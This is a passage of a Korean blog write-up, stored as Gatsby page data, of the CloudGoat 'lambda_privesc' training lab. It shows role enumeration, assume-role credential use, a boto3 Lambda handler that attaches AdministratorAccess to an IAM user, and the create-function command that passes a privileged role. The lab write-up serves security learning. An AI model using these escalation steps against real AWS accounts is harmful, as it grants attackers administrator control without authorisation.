6z\"></path></svg></a>Lambda Manager, debug 정책 조회 및 분석</h3>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">lambdaManager\n<span class=\"token string\">\"RoleName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cg-lambdaManager-role-lambda_privesc_cgidejvizwx9mo\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">\"Arn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:iam::&lt;USERID>:role/cg-lambdaManager-role-lambda_privesc_cgidejvizwx9mo\"</span><span class=\"token punctuation\">,</span>\n\nDebug\n<span class=\"token string\">\"RoleName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cg-debug-role-lambda_privesc_cgidejvizwx9mo\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">\"Arn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:iam::&lt;USERID>:role/cg-debug-role-lambda_privesc_cgidejvizwx9mo\"</span><span class=\"token punctuation\">,</span></code></pre></div>\n<ul>\n<li>앞에서 분석하였던 두 데이터를 통해 각각 접근된 정책들에대해 조회를 하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 12.222222222222221%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAY0lEQVQI112M2QqAIBREzValVbti0WLRU/T/vzeRUQ8+HDjMwGFlPWJeT6zbBU0OZHYocpgqB1MtSAUhLwi5MMgK8jwe8u1MlhadWmDsAd2/wScsm8HHeNKB8cYTxe3vId93Aw22LskuGqKNAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"4\"\n        title=\"4\"\n        src=\"/static/e265399ee763a12855bdc0aafac62600/37523/4.png\"\n        srcset=\"/static/e265399ee763a12855bdc0aafac62600/e9ff0/4.png 180w,\n/static/e265399ee763a12855bdc0aafac62600/f21e7/4.png 360w,\n/static/e265399ee763a12855bdc0aafac62600/37523/4.png 720w,\n/static/e265399ee763a12855bdc0aafac62600/302a4/4.png 1080w,\n/static/e265399ee763a12855bdc0aafac62600/07a9c/4.png 1440w,\n/static/e265399ee763a12855bdc0aafac62600/fde66/4.png 1574w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 23.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABBElEQVQY002Q707CQBDED2iLBtpe76hE6PUPVA22BUEjJGiEDzyD7/8kP9OjJH6YzMxuNju74vllw7KsuXFinkhMSV6syMtXLvE7v/cfTIMMXxmUzpk8LCzi6ZJAGtQkR8fXmhj5M1sc+XP6ToToy45DhAgQTgsfMZD0Bl1P+Agx7vBP9wKEdxczNysW5Rs6LkiyijSvyYoGk1UUxZo0rWy/WG7IF2ubJNIZUqVIldmEgUyuyyKdEkYJUhnLfjhjHDwSyjmRMtY7nsYdTnCHmoGrrG6D3Pim2wvE6Xzh+HXm53ThcPimbnbUzZbtbs/n/khd73A8ZV/Q6862g523r+l0m/APc3B9ea63FDgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"5\"\n        title=\"5\"\n        src=\"/static/e5d1d8ff43eceab174d7615ac8ef4c3c/37523/5.png\"\n        srcset=\"/static/e5d1d8ff43eceab174d7615ac8ef4c3c/e9ff0/5.png 180w,\n/static/e5d1d8ff43eceab174d7615ac8ef4c3c/f21e7/5.png 360w,\n/static/e5d1d8ff43eceab174d7615ac8ef4c3c/37523/5.png 720w,\n/static/e5d1d8ff43eceab174d7615ac8ef4c3c/302a4/5.png 1080w,\n/static/e5d1d8ff43eceab174d7615ac8ef4c3c/26a94/5.png 1102w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>두 정책 역시 정책 ARN 정보와 관리자급에 대한 권한임을 유추할 수 있습니다. 이를 이용하여 lambda 기능을 전부 관리할 수 있는 manager이자 <code class=\"language-text\">iam:PassRole</code> 이기 때문입니다.</li>\n<li>그렇다면은 lambda의 <code class=\"language-text\">CreateFunction</code> , <code class=\"language-text\">InvokeFunction</code> 을 통해서 권한 상승이 가능해집니다.</li>\n<li>이는 lambda 코드를 작성할시 AWS 라이브러리를 가져오는 코드가 포함되어 새로운 lambda 함수 에 기존 IAM Rule을 전하기 때문입니다.</li>\n<li>AWS API를 통해서 함수를 호출하여 코드를 실행하게되면 계정에 존재하는 모든 lambda 서비스 rule과 attached된 권한에 대한 액세스 권한이 사용자에게 부여가 될 수있습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 39.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABF0lEQVQoz5WS226CQBRFDxclSGFgBqUEuSmKoG1E2ybat/ahP9D//5XdzFRsfGnwYWdmcnLWueyh8/snTucP7J7fsO9OaLZHFGWDTdOhbjusii2+xBHf7iuySY4HnoKLAjwswYIMLpsjEAU8P0UgcpA5FkjSFtX6AJ/nsOwI5jiEZgTQDB9ELkhzQLqUB9IYSPP+pLPbU16MEUdePmGetRDTUlW07Bl0M1AyTa5kXN7/ia4XmmAaLVHVB9VtFK9UIdmlPgB05fQJMtl2HrGo9siKHeQq+tg9UOoT5Py2E8FxY4ys8BJkN9AhYCLykKQN1psXxEmt3HNZoqByj/eOrVyWlkuYzzOI2QJhtFTfgYe/5shOhwJ/ADJ8usvHFVbHAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"6\"\n        title=\"6\"\n        src=\"/static/9cecd84e5460ded2e9e6500652e7bbfa/37523/6.png\"\n        srcset=\"/static/9cecd84e5460ded2e9e6500652e7bbfa/e9ff0/6.png 180w,\n/static/9cecd84e5460ded2e9e6500652e7bbfa/f21e7/6.png 360w,\n/static/9cecd84e5460ded2e9e6500652e7bbfa/37523/6.png 720w,\n/static/9cecd84e5460ded2e9e6500652e7bbfa/f53a0/6.png 1062w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>접근이 불가능한 AWS 리소스에 액세스 하기 위해서 임시 Credential을 사용하기 위해서 <code class=\"language-text\">assum-role</code> 을 통해 해당 구성요소들을 획득할 수 있습니다.</li>\n<li>ARN 에 해당하는 권한들 과 이에 대한 참조되는 권한 리소스에 접근을 할 수 가 있습니다.</li>\n<li>디버그 에 해당 하는 권한을 chris가 맡기 위해서는 rule에 해당하는 정보가 없기 때문에 lambdaManager에 해당하는 <code class=\"language-text\">assum-role</code>을 적용합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 31.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABIElEQVQY03WRW3OCMBCFeaki4LWgEMKlrUgCtlOrgFovndZOr///75zOhkGf+nBmz9nM7uRLtNvpA/J5CZEtIfMCUZyB8RnCWOLaiTAY+mjpNlq6A92YoN0ZK0+1yYblwrA8lTVNs+BxgcXqiDC+Bw8ziLxCNl/jLlnAZSn8QCKM5+gNAnTMepjUMScwu+ySLRfaTKxQbU44vPxgu/vA8/4Tx9df7I/fSpRJdNao3JxQrt+Up9n19h27w5fKGuMCIivw+LRHKguIrITMK9WjW7psdsbUjRqTfJNrfAdXbfuC7EymSNKlwhvZNwqRBRJjN1GiPBhFCpdEmITboJpdD90+rxe6bArPT5SCSKpKPfoY8jxI0R/y81v9t9Dq+ar3B2IqomBn5ZSoAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"7\"\n        title=\"7\"\n        src=\"/static/8484b5ba67ae631b7e3caf173b9d8b0a/37523/7.png\"\n        srcset=\"/static/8484b5ba67ae631b7e3caf173b9d8b0a/e9ff0/7.png 180w,\n/static/8484b5ba67ae631b7e3caf173b9d8b0a/f21e7/7.png 360w,\n/static/8484b5ba67ae631b7e3caf173b9d8b0a/37523/7.png 720w,\n/static/8484b5ba67ae631b7e3caf173b9d8b0a/302a4/7.png 1080w,\n/static/8484b5ba67ae631b7e3caf173b9d8b0a/3fca6/7.png 1112w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>다음과 같이 만료시간이 정해져있는 세션 토큰 정보를 수동으로 AWS profile 에 등록을 진행합니다</li>\n<li>세션 토크은 만료 시간이 정해져 있기 때문에 해당 시가내에 수동으로 입력하고 사용해야 합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 18.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA3ElEQVQY002QS3OCQBCE92B5iAta5hAFRI0uIMFCFrUUF1cxFYmP5JD//1vacnxUDlNfd19methssUOSajjdD7QsD93+GENPQvgSb20Bo27TcNOG2eigUn0FYxyMGffh/8jB/NEMQTjH0JfwghSxzBEnCtN5ATnVCKMF+SjOaPFAJLTY7ozQtoM7faLjhmBf5R+Kz19sijO2u5+nVutv8uvNEau8pGyp9lD6luf6gCwvkak9ab09kWa3einVdHsRXfAuJlT9yv4gRqPpUuUX3oJRd54vqBkWZQ995QXgBHUNsX8iPgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"8\"\n        title=\"8\"\n        src=\"/static/31212bdf10a7d5b9d49e27deb59e9340/37523/8.png\"\n        srcset=\"/static/31212bdf10a7d5b9d49e27deb59e9340/e9ff0/8.png 180w,\n/static/31212bdf10a7d5b9d49e27deb59e9340/f21e7/8.png 360w,\n/static/31212bdf10a7d5b9d49e27deb59e9340/37523/8.png 720w,\n/static/31212bdf10a7d5b9d49e27deb59e9340/40601/8.png 945w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"관리자-정책-권한을-iam-user-chris에-연결할-lambda-함수-생성\" style=\"position:relative;\"><a href=\"#%EA%B4%80%EB%A6%AC%EC%9E%90-%EC%A0%95%EC%B1%85-%EA%B6%8C%ED%95%9C%EC%9D%84-iam-user-chris%EC%97%90-%EC%97%B0%EA%B2%B0%ED%95%A0-lambda-%ED%95%A8%EC%88%98-%EC%83%9D%EC%84%B1\" aria-label=\"관리자 정책 권한을 iam user chris에 연결할 lambda 함수 생성 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>관리자 정책 권한을 IAM User: Chris에 연결할 Lambda 함수 생성</h3>\n<ul>\n<li>python 언어를 선택해서 lambda 기능을 사용할 함수를 구성하였습니다</li>\n<li><code class=\"language-text\">boto3</code> 모듈은 AWS SDK에 해당하고 AWS CLI를 설치하였다면 같은 의존성에 의해 같이 설치가 되었을 것 입니다.</li>\n<li>AWS EC2, AWS S3 등과 같은 AWS 서비스를 생성, 구성 관리를 할 수 있으며 다양한 AWS 서비스에 대한 Low-level 수준의 액세스를 제공해줍니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.666666666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAiUlEQVQY062MWwuCQBhE9xK5l89Ncdd0pSIRhN7z//+zCZcVKqInHw4zw8Bh3fmOy/zEOC+4XR8I3QRyA8hFaBVgM0b53D2UbmHKCLNm4dO3QiqAaeMRmgFNO8JSD0M9bBmT9FtIuf8VyqMH4w5MnD5z67L6ne//RtpFgJAVxKHehSTkWch3EL8A4cNwka4HXtcAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"9\"\n        title=\"9\"\n        src=\"/static/3e270db1ea353ea751b3e528108e2deb/37523/9.png\"\n        srcset=\"/static/3e270db1ea353ea751b3e528108e2deb/e9ff0/9.png 180w,\n/static/3e270db1ea353ea751b3e528108e2deb/f21e7/9.png 360w,\n/static/3e270db1ea353ea751b3e528108e2deb/37523/9.png 720w,\n/static/3e270db1ea353ea751b3e528108e2deb/302a4/9.png 1080w,\n/static/3e270db1ea353ea751b3e528108e2deb/48ca3/9.png 1084w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> boto3 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">lambda_handler</span><span class=\"token punctuation\">(</span>evt<span class=\"token punctuation\">,</span> cont<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tcli <span class=\"token operator\">=</span> client<span class=\"token punctuation\">(</span><span class=\"token string\">'iam'</span><span class=\"token punctuation\">)</span>\n\tresp <span class=\"token operator\">=</span> cli<span class=\"token punctuation\">.</span>attach_user_policy<span class=\"token punctuation\">(</span>\n\t\t\t\t\t\t\t\t\t\t\tUserName<span class=\"token operator\">=</span><span class=\"token string\">'chris-lambda_privesc_cgidejvizwx9mo'</span><span class=\"token punctuation\">,</span>\n\t\t\t\t\t\t\t\t\t\t\tPolicyArn<span class=\"token operator\">=</span><span class=\"token string\">'arn:aws:iam::aws:policy/AdministratorAccess'</span>\n\t<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">return</span> resp\n\t\t</code></pre></div>\n<ul>\n<li><code class=\"language-text\">iam</code> 서비스를 이용하여 <code class=\"language-text\">chris</code> 사용자에게 debug 관리 정책을 연결할 예정이기 때문에 다음과 같이 <code class=\"language-text\">attach_user_policy</code> 메서드를 사용하여 해당 인스턴스를 생성할 수 있도록 설계를 하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 40%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABmElEQVQoz3WR2W7aUBRFrwdMgsHY2DhgbDyQAgbHkGCGCFrSQe0LatWnqP3//1iVb6OqapWHpStt6eyz97nifnNkf3jiePrI6fyF9HRhUVQsi4pq+5ZyfaAs9+SrLe+iih/Bmef4PT/jDzyHT3z3d9wFE/zgDVG8RJidgDgrCaKcUZSTJks8f0KrPcTuxRLLjiRtd4xuDxFGF9G0EY0uwnBQDI9G00Nr9BD1QHl/YpZvWdwdiLMV2e1abrsZTnH7Ka6f4bgxrpfieSmt1g2qaqNpDppmo2o2ygui64x5qM5ESSFTNZouxlWf5rWPbrgI0UEo1p+BGlV3XkVYdsju8ROzvGK+2BGEc0m9IAhzmazrRP+ZvWYsrs2BrDhOC1mzY4dctXyZ1uz8pk5c30fTHXS99w+O1KVhXbk2rO+XZCuZbDiYyI+o9bY1otHsI4T5Ur2DUE2EYv711loXRbVR6oTT2ZqHzZFytWe+3GDlj0TxnFF4S5zmxEnOZFKQTAsqd8E3e8vF23Nxtnx193xuL8msAYbpy4S/AP/GzNcsBsXFAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"10\"\n        title=\"10\"\n        src=\"/static/d53fd0534127fb849317f5e0c7e37fe3/37523/10.png\"\n        srcset=\"/static/d53fd0534127fb849317f5e0c7e37fe3/e9ff0/10.png 180w,\n/static/d53fd0534127fb849317f5e0c7e37fe3/f21e7/10.png 360w,\n/static/d53fd0534127fb849317f5e0c7e37fe3/37523/10.png 720w,\n/static/d53fd0534127fb849317f5e0c7e37fe3/302a4/10.png 1080w,\n/static/d53fd0534127fb849317f5e0c7e37fe3/7798c/10.png 1183w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>새로운 lambda 함수를 생성하는 방법은 <code class=\"language-text\">lambda-create-function</code> 기능을 이용하여 lambda 핸들러 함수를 등록할 수가 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">aws <span class=\"token keyword\">lambda</span> create<span class=\"token operator\">-</span>function \\\n\t<span class=\"token operator\">-</span><span class=\"token operator\">-</span>function<span class=\"token operator\">-</span>name admin_function \\\n\t<span class=\"token operator\">-</span><span class=\"token operator\">-</span>runtime python3<span class=\"token punctuation\">.</span><span class=\"token number\">6</span> \\\n\t<span class=\"token operator\">-</span><span class=\"token operator\">-</span>role arn<span class=\"token punctuation\">:</span>aws<span class=\"token punctuation\">:</span>iam<span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">&lt;</span>USERID<span class=\"token operator\">></span><span class=\"token punctuation\">:</span>role<span class=\"token operator\">/</span>cg<span class=\"token operator\">-</span>debug<span class=\"token operator\">-</span>role<span class=\"token operator\">-</span>lambda_privesc_cgidejvizwx9mo \\\n\t<span class=\"token operator\">-</span><span class=\"token operator\">-</span>handler lambda_function<span class=\"token punctuation\">.</span>lambda_handler \\\n\t<span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token builtin\">zip</span><span class=\"token operator\">-</span><span class=\"token builtin\">file</span> fileb<span class=\"token punctuation\">:</span><span class=\"token operator\">//</span>lambda_function<span class=\"token punctuation\">.</span>py<span class=\"token punctuation\">.</span><span class=\"token builtin\">zip</span> \\\n\t<span class=\"token operator\">-</span><span class=\"token operator\">-</span>profile lambdaManager</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 6.666666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAABCAYAAADeko4lAAAACXBIWXMAAAsTAAALEwEAmpwYAAAATUlEQVQI1wXBURJAIBRAUUtpRvVEJYk+jIzpy/4XdJ0z3Gvjk4cujT69XCpjtMdKYpozyexUfXCMhapPimRCLPhQUKFi3IaViFsy4hI/4jAe/6JHhyIAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"11\"\n        title=\"11\"\n        src=\"/static/9f7cad50d171810ffd41fc7403e4b62d/37523/11.png\"\n        srcset=\"/static/9f7cad50d171810ffd41fc7403e4b62d/e9ff0/11.png 180w,\n/static/9f7cad50d171810ffd41fc7403e4b62d/f21e7/11.png 360w,\n/static/9f7cad50d171810ffd41fc7403e4b62d/37523/11.png 720w,\n/static/9f7cad50d171810ffd41fc7403e4b62d/302a4/11.png 1080w,\n/static/9f7cad50d171810ffd41fc7403e4b62d/07a9c/11.png 1440w,\n/static/9f7cad50d171810ffd41fc7403e4b62d/ddb6a/11.png 1592w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>성공적으로 완료가 된 상황이라면 다음과 같이 StatusCode:200을 반환합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 31.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABOklEQVQY02WQW2+jMBBGHRIIEC42N3ONIbAtIau2apqH/f8/7KwgfajUh6NP8oyOZ0ac+4V5+eK6PKi6K34xEYQlQVQRq5ZINlvGsqU5tvR+j/ENxjP0Xo92NK6b4ngFrq8R83Ln7eMft78PxvlO/vqgbibyoifXA9l3Fnrg5o/coyufK+HMV7gwuTXBKcf1S05hjdDVRGduXKZ3dP1ClF/IioFYdYRxsxHJ9pl2gTqWSGdFo5ySwE6xHcXeTjg4KULsom3Usn5BJmeyYhWOVM1M3V63T9ZaUf4hTs6Eq1y2yNTgBRViL9ntFbst5Q9h84pKe8pyQlerYCKIGrzTcxXrkCCs8Df7GGE9ZdZBIdb7qKQjzQwyM3j5iEpa5PqWG1R63mprT+d2jP7A5ZvJH6iOGs9Lsexkm/A/MgmVUFyl4mEAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"12\"\n        title=\"12\"\n        src=\"/static/0edd4cd12586686881d2edf3d9a0aab6/37523/12.png\"\n        srcset=\"/static/0edd4cd12586686881d2edf3d9a0aab6/e9ff0/12.png 180w,\n/static/0edd4cd12586686881d2edf3d9a0aab6/f21e7/12.png 360w,\n/static/0edd4cd12586686881d2edf3d9a0aab6/37523/12.png 720w,\n/static/0edd4cd12586686881d2edf3d9a0aab6/302a4/12.png 1080w,\n/static/0edd4cd12586686881d2edf3d9a0aab6/b9024/12.png 1203w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">lambda invoke</code> 기능을 이용하여 생성한 lambda 코드를 실핼한 결과 값을 로컬 내에 저장을 하고 해당 결과를 확인 해보면 등록하려고 하였던 debug rule이 attached 된 것을 확인하고 모든 시나리오가 끝났습니다.</li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%EA%B0%9C%EC%9A%94\">시나리오 개요</a></p>\n<ul>\n<li><a href=\"#%EC%9E%90%EC%9B%90\">자원</a></li>\n<li><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90\">취약점</a></li>\n<li><a href=\"#%EB%AA%A9%ED%91%9C\">목표</a></li>\n<li><a href=\"#exploit-%ED%9D%90%EB%A6%84%EB%8F%84\">exploit 흐름도</a></li>\n<li><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%99%98%EA%B2%BD%EC%84%A4%EC%A0%95\">시나리오 환경설정</a></li>\n<li><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%9D%90%EB%A6%84%EB%8F%84\">exploit 시나리오 흐름도</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4\">Exploit 시나리오</a></p>\n<ul>\n<li><a href=\"#iam-user-chris-%EC%A0%95%EB%B3%B4%EB%A5%BC-%ED%86%A0%EB%8C%80%EB%A1%9C-%EC%82%AC%EC%9A%A9%ED%95%A0-%EC%88%98-%EC%9E%88%EB%8A%94-%EA%B6%8C%ED%95%9C-%EB%82%98%EC%97%B4\">IAM User: Chris 정보를 토대로 사용할 수 있는 권한 나열</a></li>\n<li><a href=\"#lambda-%EC%A0%95%EC%B1%85-%EA%B3%BC-%EA%B4%80%EB%A0%A8%EB%90%9C-%EA%B8%B0%EB%8A%A5-%EB%82%98%EC%97%B4\">lambda 정책 과 관련된 기능 나열</a></li>\n<li><a href=\"#lambda-manager-debug-%EC%A0%95%EC%B1%85-%EC%A1%B0%ED%9A%8C-%EB%B0%8F-%EB%B6%84%EC%84%9D\">Lambda Manager, debug 정책 조회 및 분석</a></li>\n<li><a href=\"#%EA%B4%80%EB%A6%AC%EC%9E%90-%EC%A0%95%EC%B1%85-%EA%B6%8C%ED%95%9C%EC%9D%84-iam-user-chris%EC%97%90-%EC%97%B0%EA%B2%B0%ED%95%A0-lambda-%ED%95%A8%EC%88%98-%EC%83%9D%EC%84%B1\">관리자 정책 권한을 IAM User: Chris에 연결할 Lambda 함수 생성</a></li>\n</ul>\n</li>\n</ul>\n</div>","frontmatter":{"date":"December 31, 2021","title":"클라우드 서비스 취약점 분석 3 (CloudGoat: lambda_privesc)","categories":"CLOUD","author":"Zer0Luck","emoji":"🤭"},"fields":{"slug":"/cloud-service-vuln-3/"}},"site":{"siteMetadata":{"siteUrl":"https://zer0luck.kr","comments":{"utterances":{"repo":"dnsdudrla97/dnsdudrla97.github.io"}}}}},"pageContext":{"slug":"/cloud-service-vuln-0/","nextSlug":"/we_application_SSRF/","prevSlug":"/cloud-service-vuln-3/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}